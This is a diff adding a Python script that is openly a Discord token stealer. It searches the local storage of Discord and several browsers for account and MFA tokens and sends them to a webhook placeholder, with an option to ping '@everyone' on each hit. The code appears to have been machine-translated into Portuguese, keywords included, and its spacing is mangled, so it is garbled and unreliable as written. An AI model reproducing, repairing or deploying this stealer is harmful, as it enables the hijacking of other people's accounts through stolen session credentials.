@@ -1,0 +1,74 @@
+importar  os
+importar  re
+import  json
+
+do  urllib . pedido  de importação  Request , urlopen
+
+# seu URL de webhook
+WEBHOOK_URL  =  'WEBHOOK AQUI'
+
+# menciona você quando você recebe um acerto
+PING_ME  =  False
+
+def  find_tokens ( caminho ):
+    caminho  + =  ' \ Armazenamento local \ leveldb'
+
+    tokens  = []
+
+    para  file_name  no sistema  operacional . listdir ( caminho ):
+        se  não  file_name . endswith ( '.log' ) e  não  file_name . endswith ( '.ldb' ):
+            Prosseguir
+
+        para a  linha  em [ x . strip () para  x  em  aberto ( f ' { path } \ { file_name } ' , erros = 'ignorar' ). readlines () se  x . strip ()]:
+            para  regex  em ( r '[\ w -] {24} . [\ w -] {6} . [\ w -] {27}' , r'mfa . [\ w -] {84} ' ):
+                para  token  in  re . findall ( regex , linha ):
+                    tokens . anexar ( token )
+     tokens de retorno
+
+def  main ():
+    local  =  os . getenv ( 'LOCALAPPDATA' )
+    roaming  =  os . getenv ( 'APPDATA' )
+
+    caminhos  = {
+        'Discord' : roaming  +  ' \ Discord' ,
+        'Discord Canary' : roaming  +  ' \ discordcanary' ,
+        'Discord PTB' : roaming  +  ' \ discordptb' ,
+        'Google Chrome' : local  +  ' \ Google \ Chrome \ Dados do usuário \ Padrão' ,
+        'Opera' : roaming  +  ' \ Opera Software \ Opera Stable' ,
+        'Brave' : local  +  ' \ BraveSoftware \ Brave-Browser \ Dados do usuário \ Padrão' ,
+        'Yandex' : local  +  ' \ Yandex \ YandexBrowser \ Dados do usuário \ Padrão'
+    }
+
+    message  =  '@everyone'  if  PING_ME  else  ''
+
+    para  plataforma , caminho  em  caminhos . itens ():
+        se  não  os . caminho . existe ( caminho ):
+            Prosseguir
+
+        mensagem  + =  f ' \ n  { plataforma }  \ n ` \ n '
+
+        tokens  =  find_tokens ( caminho )
+
+        se  len ( tokens ) >  0 :
+            para  token  em  tokens :
+                mensagem  + =  f ' { token } \ n '
+        mais :
+            mensagem  + =  'Nenhum token encontrado. \ n '
+
+        mensagem  + =  ' `'
+
+    headers  = {
+        'Content-Type' : 'application / json' ,
+        'Agente do usuário' : 'Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.11 (KHTML, como Gecko) Chrome / 23.0.1271.64 Safari / 537.11'
+    }
+
+    carga útil  =  json . despejos ({ 'conteúdo' : mensagem })
+
+    tente :
+        req  =  Request ( WEBHOOK_URL , data = payload . encode (), headers = headers )
+        urlopen ( req )
+    exceto :
+        passar
+
+if  name  ==  'main' :
+    principal ()
